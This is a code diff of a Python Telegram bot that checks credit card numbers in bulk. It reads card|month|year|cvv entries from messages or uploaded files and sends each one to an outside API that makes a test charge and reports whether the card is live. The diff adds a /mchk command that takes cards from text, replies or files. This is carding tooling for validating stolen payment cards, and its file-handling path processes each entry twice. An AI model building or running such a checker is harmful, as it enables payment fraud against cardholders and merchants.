@@ -5,13 +5,12 @@ import re
 import os
 from pyrogram import filters
 
-async def process_credit_card(cc_entry, message):
+async def process_credit_card(cc_entry):
     try:
         x = re.findall(r'\d+', cc_entry)
         if len(x) != 4:
-            print(f'Invalid CC format in file: {cc_entry}')
-            return
-        
+            return f'Invalid CC format in entry: {cc_entry}\n'
+
         ccn = x[0]
         mm = x[1]
         yy = x[2]
@@ -19,8 +18,7 @@ async def process_credit_card(cc_entry, message):
 
         VALID = ('37', '34', '4', '51', '52', '53', '54', '55', '64', '65', '6011')
         if not ccn.startswith(VALID):
-            print(f'Invalid CC type in file: {cc_entry}')
-            return
+            return f'Invalid CC type in entry: {cc_entry}\n'
 
         async with aiohttp.ClientSession() as session:
             url = "https://mvy.ai/sk_api/api.php"
@@ -34,47 +32,68 @@ async def process_credit_card(cc_entry, message):
 
                 if r['status'] == 'die':
                     fullcc = f"{ccn}|{mm}|{yy}|{cvv}"
-                    die = f"{fullcc}\n𝖣𝖤𝖢𝖫𝖨𝖭𝖤𝖣 ❌ - {r['message']}\n\n"
-                    return die
+                    return f"{fullcc}\nDECLINED ❌ - {r['message']}\n\n"
 
                 elif r['status'] == 'approved':
                     fullcc = f"{ccn}|{mm}|{yy}|{cvv}"
-                    approved = f"{fullccc}\n𝖲𝖳𝖱𝖨𝖯𝖤 𝖠𝖴𝖳𝖧 $2 ✅ - {r['message']} - CHARGED ${r['payment_info']['amount']}\n\n"
-                    return approved
+                    return f"{fullcc}\nBRAINTREE AUTH $5 ✅ - {r['message']} - CHARGED ${r['payment_info']['amount']}\n\n"
+
                 else:
-                    mm = "Unknown status received.\n\n"
-                    return mm
+                    return "Unknown status received.\n\n"
 
     except Exception as e:
-        print(f"Error processing CC entry: {e}")
+        return f"Error processing CC entry: {e}\n"
 
 
-@app.on_message(filters.command("chkfile", prefixes=[".", "/"]))
-async def check_cc_file(_, message):
+async def process_credit_cards_in_file(file_path):
+    results = []
     try:
-        reply_msg = message.reply_to_message
-        if reply_msg and reply_msg.document:
-            vj = ""
-            file_id = reply_msg.document.file_id
-            file_path = await app.download_media(file_id)
+        with open(file_path, 'r') as file:
+            tasks = []
+            for line in file:
+                cc_entry = line.strip()
+                task = asyncio.create_task(process_credit_card(cc_entry))
+                tasks.append(task)
 
-            with open(file_path, 'r') as file:
-                tasks = []
-                for line in file:
-                    cc_entry = line.strip()
-                    task = asyncio.create_task(process_credit_card(cc_entry, message))
-                    tasks.append(task)
-
-                results = await asyncio.gather(*tasks)
-                for result in results:
-                    vj += result
-                with open(f'{message.from_user.id}.txt', 'a') as f:
-                    f.write(f"{vj}")
-                await message.reply_document(f"{message.from_user.id}.txt")
-            os.remove(file_path)
-            os.remove(f"{message.from_user.id}.txt")
-        else:
-            await message.reply_text("Please reply to a text file containing credit card details.")
+            results = await asyncio.gather(*tasks)
 
     except Exception as e:
-        await message.reply_text(f"Error reading CC file: {e}")
+        results.append(f"Error reading file: {e}\n")
+
+    return results
+
+
+@app.on_message(filters.command("mchk", prefixes=[".", "/"]))
+async def check_cc(_, message):
+    command_prefix_length = len(message.text.split()[0])
+    cc_entry = message.text[command_prefix_length:].strip()
+
+    reply_msg = message.reply_to_message
+    if reply_msg:
+        if reply_msg.text:
+            cc_entries = reply_msg.text.strip().split('\n')
+        elif reply_msg.document:
+            file_path = await app.download_media(reply_msg.document.file_id)
+            cc_entries = await process_credit_cards_in_file(file_path)
+            os.remove(file_path)
+        else:
+            await message.reply_text("Unsupported reply type.")
+            return
+
+        if cc_entries:
+            results = await process_credit_card_entries(cc_entries)
+            await message.reply_text("\n\n".join(results))
+        else:
+            await message.reply_text("No valid credit card details found in the reply.")
+
+    elif cc_entry:
+        cc_entries = cc_entry.split('\n')
+        results = await process_credit_card_entries(cc_entries)
+        await message.reply_text("\n\n".join(results))
+    else:
+        await message.reply_text("Please provide credit card details or reply to a message containing them.")
+
+
+async def process_credit_card_entries(cc_entries):
+    tasks = [asyncio.create_task(process_credit_card(cc_entry)) for cc_entry in cc_entries]
+    return await asyncio.gather(*tasks)
